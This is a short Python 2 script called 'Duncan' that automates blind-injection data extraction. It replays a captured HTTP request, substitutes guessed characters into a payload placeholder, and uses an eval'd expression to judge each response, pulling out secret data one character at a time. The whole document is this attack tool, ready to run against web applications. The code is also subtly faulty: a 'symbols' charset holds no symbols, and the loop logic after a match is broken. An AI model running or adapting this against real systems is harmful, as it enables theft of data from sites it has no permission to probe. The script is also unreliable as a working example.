#!/usr/bin/env python
"""Duncan v1.0
Usage:
    duncan.py -r <file> -u <base_url> -c <charset> -e <expression> [-l <length>]
    duncan.py (-h | --help)

Options:
    -h --help           Show this screen
    -r <file>           Captured request file
    -u <base_url>       Base url for the request
    -c <charset>        Charset to use "hex, hex_upper, alpha, alpha symbols"
                        if not one of above then chars entered are used
    -e <expression>     Python expression to determin a positive result
    -l <length>         Length of data to extract
"""

import sys
import requests
from docopt import docopt

def parse_request(request_file):
    headers, body = open(request_file, "r").read().split("\n\n")
    headers = headers.split("\n")
    method, path, _ = headers[0].split(" ")
    headers = {x.split(": ")[0]: x.split(": ")[1] for x in headers[1::]}
    return {"method": method, "path": path, "headers": headers, "body": body.strip()}

char_lists = {
    "hex"          : "0123456789abcdef",
    "hex_upper"    : "0123456789ABCDEF",
    "alpha"        : "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
    "alpha_symbols": "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
}

if __name__ == "__main__":
    args = docopt(__doc__, version="Duncan 1.0")

    current_data = ""
    chars = char_lists.get(args['-c'], args['-c'])
    
    data_len = 1000000
    if args["-l"]:
        data_len = int(args["-l"])

    request = parse_request(args["-r"])

    while len(current_data) < data_len:
        for c in chars:
            r = requests.request(request["method"], args["-u"] + "/" + request["path"].replace("$$PAYLOAD$$", current_data + str(c)), data=request["body"].replace("$$PAYLOAD$$", current_data + str(c)), headers=request["headers"]) 

            if eval(args["-e"]):
                current_data += c
                print "[+] Current data extracted: {}".format(current_data)
                continue
            
            if args["-l"]:
                if len(current_data) == int(args["-l"]):
                    print "[+] Data Extracted: {}".format(current_data)
                    sys.exit(0)

